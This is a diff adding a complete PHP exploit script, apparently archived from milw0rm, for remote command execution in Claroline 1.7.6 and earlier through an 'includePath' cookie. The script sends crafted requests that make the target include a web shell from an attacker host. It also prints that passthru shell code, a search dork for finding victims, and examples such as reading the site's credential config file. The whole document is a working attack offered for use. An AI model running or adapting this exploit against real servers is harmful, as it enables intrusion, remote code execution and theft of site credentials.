@@ -1,0 +1,150 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "Claroline <= 1.7.6 \"includePath\" remote cmmnds xctn\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "dork: \"Powered by Claroline\" -demo\r\n\r\n";
+
+/*
+works with
+register_globals=On
+allow_url_fopen=On
+*/
+
+if ($argc<5) {
+echo "Usage: php ".$argv[0]." host path location cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to claroline\r\n";
+echo "location:  arbitrary location with the code to include\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." target.com /claroline176/ http://evilsite.com ls -la\r\n";
+echo "php ".$argv[0]." target.com /claroline176/ http://evilsite.com cat ./..\r\n";
+echo "/../../inc/conf/claro_main.conf.php -p81\r\n";
+echo "php ".$argv[0]." target.com / http://evilsite.com uname -a -P1.1.1.1:80\r\n\r\n";
+echo "note, on remote location you need a\r\n";
+echo "/lib/extauth.lib.php/index.html\r\n";
+echo "with this code inside:\r\n\r\n";
+echo "<?php\r\n";
+echo 'if (get_magic_quotes_gpc()){$_REQUEST["cmd"]=stripslashes($_REQUEST["cmd"]);}'."\r\n";
+echo "error_reporting(0);\r\n";
+echo 'ini_set("max_execution_time",0);'."\r\n";
+echo 'echo "*delim*";'."\r\n";
+echo 'passthru($_REQUEST["cmd"]);'."\r\n";
+echo 'echo "*delim*";'."\r\n";
+echo "die;\r\n";
+echo '?>'."\r\n";
+die;
+}
+
+/*
+  explaination:
+  is too hard to check the same folder of 1.7.5 exploit? really, too hard...
+*/
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];$path=$argv[2];$location=$argv[3];$cmd='';
+if (($path[0]<>'/') | ($path[strlen($path)-1]<>'/'))
+{die("Check the path, it must begin and end with a trailing slash\r\n");}
+$port=80;$proxy="";
+for ($i=4; $i<=$argc-1; $i++)
+{
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy<>'') {$p="http://".$host.":".$port.$path;} else {$p=$path;}
+
+$script=array('mambo.inc.php','postnuke.inc.php');
+for ($i=0; $i<=count($script)-1; $i++)
+{
+$packet ="GET ".$p."claroline/auth/extauth/drivers/".$script[$i]." HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Cookie: cmd=".urlencode($cmd)."; includePath=".urlencode($location).";\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+if (strstr($html,"*delim*"))
+{
+  echo "Exploit succeeded...\r\n\r\n";
+  $temp=explode("*delim*",$html);
+  die($temp[1]);
+}
+}
+//if you are here...
+echo "Exploit failed...";
+//debug
+echo $html;
+?>
+
+# milw0rm.com [2006-06-05]
